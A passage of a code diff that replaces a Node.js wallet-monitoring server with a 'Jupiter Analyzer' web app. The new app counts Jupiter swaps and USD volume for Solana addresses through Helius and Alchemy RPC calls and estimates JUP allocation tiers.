+            if (onProgress) onProgress(totalJupSwaps, Math.min(startIdx + 100, signatures.length), totalVolumeUSD);
+        } catch (err) {}
+    };
+
+    for (let i = 0; i < batches.length; i += concurrency) {
+        if (!isRunning) break;
+        await Promise.all(batches.slice(i, i + concurrency).map((b, idx) => processBatch(b, i * 100 + idx * 100)));
+    }
+    return { count: totalJupSwaps, volume: totalVolumeUSD, totalAnalyzed: signatures.length };
+}
+
+async function checkRpcHealth(url, method = "getHealth") {
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        const resp = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: [] }),
+            signal: controller.signal
         });
-        
-        // Start auto refresh when page loads
-        document.addEventListener('DOMContentLoaded', () => {
-            loadNotifications();
-            // Auto refresh disabled - only load once on page load
-            // startAutoRefresh();
-        });
-    </script>
-</body>
-</html>`;
-    
-    res.send(html);
-});
+        clearTimeout(timeoutId);
+        return resp.ok;
+    } catch (e) {
+        return false;
+    }
+}
 
-// API Routes
-app.post('/api/add-wallets', (req, res) => {
-    const { privateKeys } = req.body;
-    const result = monitor.processPrivateKeys(privateKeys);
-    res.json(result);
-});
-
-app.get('/api/status', async (req, res) => {
-    const status = await monitor.getStatus();
-    res.json(status);
-});
-
-app.post('/api/stop', (req, res) => {
-    monitor.stopAllMonitoring();
-    res.json({ success: true, message: 'تم إيقاف مراقبة جميع المحافظ' });
-});
-
-app.get('/api/notifications', (req, res) => {
-    res.json(monitor.notifications);
-});
-
-app.get('/health', (req, res) => {
+app.get('/health', async (req, res) => {
+    const heliusStatus = await Promise.all(HELIUS_URLS.map(url => checkRpcHealth(url, "getAsset")));
+    const alchemyStatus = await Promise.all(ALCHEMY_URLS.map(url => checkRpcHealth(url)));
     res.json({
-        status: 'healthy',
-        uptime: process.uptime(),
-        wallets: monitor.wallets.length,
-        monitoring: monitor.subscriptionIds.filter(id => id !== null).length,
-        timestamp: new Date().toISOString()
+        helius: heliusStatus.filter(Boolean).length,
+        alchemy: alchemyStatus.filter(Boolean).length
     });
 });
 
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🌐 Express server running on port ${PORT}`);
-    console.log(`🔗 Web interface: http://localhost:${PORT}`);
-    console.log(`🔗 Health check: http://localhost:${PORT}/health`);
+app.get('/', (req, res) => {
+    res.send(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Jupiter Analyzer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { background-color: #0f172a; color: #f8fafc; font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .progress-bar { transition: width 0.3s ease-in-out; }
+        .break-all { word-break: break-all; }
+        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: #10b981; color: white; padding: 12px 24px; border-radius: 12px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); transition: top 0.5s ease; z-index: 1000; }
+        #toast.show { top: 20px; }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+    <div id="toast">Analysis Completed! ✅</div>
+    <div class="max-w-4xl mx-auto overflow-hidden">
+        <header class="mb-8 text-center">
+            <h1 class="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-500">Jupiter Analyzer</h1>
+            <p id="subHeader" class="text-slate-400 mt-2">Solana Wallet Swap & Volume Analysis</p>
+            <div id="connectionStatus" class="mt-4 flex justify-center gap-3"></div>
+        </header>
+        <div class="glass rounded-2xl p-4 md:p-6 mb-8">
+            <div class="flex justify-between items-center mb-4">
+                <label class="text-sm font-medium">Wallet Addresses</label>
+                <select id="yearSelect" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-1 text-sm outline-none">
+                    <option value="2024">Year 2024</option>
+                    <option value="2025" selected>Year 2025</option>
+                </select>
+            </div>
+            <textarea id="addresses" class="w-full h-40 bg-slate-900 border border-slate-700 rounded-xl p-4 focus:ring-2 focus:ring-blue-500 outline-none text-sm" placeholder="Enter Solana addresses..."></textarea>
+            <div class="flex flex-col md:flex-row gap-4 mt-4">
+                <button onclick="start()" id="startBtn" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition-all">Start Analysis</button>
+                <button onclick="stop()" id="stopBtn" class="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl transition-all opacity-50 cursor-not-allowed" disabled>Stop</button>
+            </div>
+        </div>
+        <div id="status" class="mb-8 hidden">
+            <div class="flex justify-between mb-2">
+                <span id="progressText" class="text-xs md:text-sm font-medium">Progress: 0%</span>
+                <span id="activeCount" class="text-xs md:text-sm font-medium">Active: 0</span>
+            </div>
+            <div class="w-full bg-slate-800 rounded-full h-3 overflow-hidden">
+                <div id="progressBar" class="progress-bar bg-gradient-to-r from-blue-500 to-purple-600 h-full w-0"></div>
+            </div>
+        </div>
+        <div id="activeWorkers" class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8"></div>
+        <div class="glass rounded-2xl p-4 md:p-6">
+            <h2 class="text-lg md:text-xl font-bold mb-4 flex justify-between items-center">Recent Results <span id="totalResults" class="text-sm font-normal text-slate-400">Total: 0</span></h2>
+            <div id="resultsList" class="space-y-4"></div>
+        </div>
+    </div>
+    <script>
+        const socket = io();
+        
+        async function updateHealth() {
+            try {
+                const resp = await fetch('/health');
+                const data = await resp.json();
+                const connStatus = document.getElementById('connectionStatus');
+                if (connStatus) {
+                    connStatus.innerHTML = '<div class="flex items-center gap-2 px-3 py-1 bg-slate-800/50 rounded-full border border-blue-500/30"><span class="w-2 h-2 rounded-full bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.5)]"></span><span class="text-[10px] font-bold text-blue-400 uppercase tracking-wider">Helius: ' + data.helius + ' Online</span></div><div class="flex items-center gap-2 px-3 py-1 bg-slate-800/50 rounded-full border border-purple-500/30"><span class="w-2 h-2 rounded-full bg-purple-500 shadow-[0_0_8px_rgba(168,85,247,0.5)]"></span><span class="text-[10px] font-bold text-purple-400 uppercase tracking-wider">Alchemy: ' + data.alchemy + ' Online</span></div>';
+                }
+            } catch (e) {}
+        }
+        updateHealth();
+        setInterval(updateHealth, 30000);
+
+        const calculateJupAllocation = (v) => {
+            if (v >= 1e7) return 20000; if (v >= 5e6) return 12000; if (v >= 1e6) return 5000; if (v >= 5e5) return 2500;
+            if (v >= 1e5) return 1000; if (v >= 1e4) return 200; if (v >= 1e3) return 50; if (v >= 500) return 25; return 0;
+        };
+        function start() {
+            const list = document.getElementById('addresses').value;
+            const year = document.getElementById('yearSelect').value;
+            if (!list.trim()) return;
+            document.getElementById('subHeader').innerText = 'Analysis for Year ' + year;
+            socket.emit('start', { list, year });
+            document.getElementById('status').classList.remove('hidden');
+            document.getElementById('startBtn').disabled = true; document.getElementById('startBtn').classList.add('opacity-50');
+            document.getElementById('stopBtn').disabled = false; document.getElementById('stopBtn').classList.remove('opacity-50', 'cursor-not-allowed');
+        }
+        function stop() {
+            socket.emit('stop');
+            document.getElementById('stopBtn').disabled = true; document.getElementById('stopBtn').classList.add('opacity-50', 'cursor-not-allowed');
+            document.getElementById('startBtn').disabled = false; document.getElementById('startBtn').classList.remove('opacity-50');
+        }
+        socket.on('update', (data) => {
+            const { total, current, active, results, providers } = data;
+            
+            const percent = total > 0 ? (current / total) * 100 : 0;
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('progressText').innerText = 'Progress: ' + Math.round(percent) + '% (' + current + '/' + total + ')';
+            document.getElementById('activeCount').innerText = 'Active: ' + active.length;
+            document.getElementById('totalResults').innerText = 'Total: ' + results.length;
+            document.getElementById('activeWorkers').innerHTML = active.map(w => {
+                const jup = calculateJupAllocation(w.vol);
+                return \`
+                <div class="glass p-3 rounded-xl border-l-4 border-blue-500">
+                    <div class="text-[10px] font-mono text-blue-400 break-all">\${w.address}</div>
+                    <div class="flex justify-between mt-1 items-center">
+                        <span class="text-[10px] uppercase font-bold text-slate-400">\${w.stage}</span>
+                        <span class="text-[10px] text-slate-500">\${w.tx}/\${w.total || '?'} tx</span>
+                    </div>
+                    <div class="flex flex-col mt-1">
+                        <div class="text-base font-bold text-white">$\${w.vol.toLocaleString(undefined, {maximumFractionDigits:2})}</div>
+                        \${jup > 0 ? \`<div class="text-xs font-bold text-green-400">\${jup.toLocaleString()} JUP</div>\` : ''}
+                    </div>
+                </div>\`;
+            }).join('');
+            document.getElementById('resultsList').innerHTML = results.slice(0, 20).map(r => {
+                const jup = calculateJupAllocation(r.volume);
+                return \`
+                <div class="p-3 bg-slate-900/50 rounded-xl border border-slate-800">
+                    <div class="flex justify-between items-start gap-2">
+                        <span class="text-[10px] font-mono text-slate-300 break-all flex-1">\${r.address}</span>
+                        <div class="flex flex-col items-end">
+                            <span class="bg-blue-900/30 text-blue-400 text-[10px] px-2 py-1 rounded-full font-bold">$\${r.volume.toLocaleString(undefined, {maximumFractionDigits:2})}</span>
+                            \${jup > 0 ? \`<span class="text-[10px] font-bold text-green-400 mt-1">\${jup.toLocaleString()} JUP</span>\` : ''}
+                        </div>
+                    </div>
+                </div>\`;
+            }).join('');
+        });
+        socket.on('done', () => {
+            stop();
+            const toast = document.getElementById('toast');
+            toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 2000);
+        });
+    </script>
+</body>
+</html>
+    `);
 });
+
+io.on('connection', (socket) => {
+    socket.on('start', async (data) => {
+        if (isRunning) return;
+        const { list, year } = data;
+        isRunning = true;
+        addresses = list.split('\n').map(s => s.trim()).filter(s => s.length >= 32);
+        results = [];
+        activeProgress.clear();
+        nextAddressIndex = 0;
+        const broadcast = () => socket.emit('update', { 
+            total: addresses.length, 
+            current: results.length, 
+            active: Array.from(activeProgress.entries()).map(([addr, val]) => ({ address: addr, ...val })), 
+            results,
+            providers: {
+                helius: HELIUS_KEYS.length,
+                alchemy: ALCHEMY_KEYS.length
+            }
+        });
+        const timer = setInterval(broadcast, 500);
+        const workers = (HELIUS_KEYS.length > 0 ? HELIUS_KEYS : []).map(async (heliusKey, idx) => {
+            const alchemyUrl = ALCHEMY_URLS[idx % ALCHEMY_URLS.length];
+            while (isRunning && nextAddressIndex < addresses.length) {
+                const addr = addresses[nextAddressIndex++];
+                activeProgress.set(addr, { stage: "Fetching", tx: 0, vol: 0 });
+                try {
+                    const sigs = await getSignaturesFromAlchemy(addr, alchemyUrl, year);
+                    if (!isRunning) break;
+                    if (sigs.length === 0) results.push({ address: addr, usage: 0, volume: 0, totalAnalyzed: 0 });
+                    else {
+                        activeProgress.set(addr, { stage: "Analyzing", tx: 0, total: sigs.length, vol: 0 });
+                        const d = await analyzeSignaturesHelius(sigs, addr, heliusKey, (c, curr, v) => {
+                            if (isRunning) activeProgress.set(addr, { stage: "Analyzing", tx: curr, total: sigs.length, vol: v });
+                        });
+                        if (isRunning) results.push({ address: addr, usage: d.count, volume: d.volume, totalAnalyzed: d.totalAnalyzed });
+                    }
+                } catch (e) { 
+                    if (isRunning) results.push({ address: addr, usage: 0, volume: 0, totalAnalyzed: 0, error: true }); 
+                }
+                activeProgress.delete(addr);
+            }
+        });
+        await Promise.all(workers);
+        clearInterval(timer); broadcast(); socket.emit('done'); isRunning = false;
+    });
+    socket.on('stop', () => isRunning = false);
+});
+httpServer.listen(5000, '0.0.0.0', () => console.log('Server running on port 5000'));
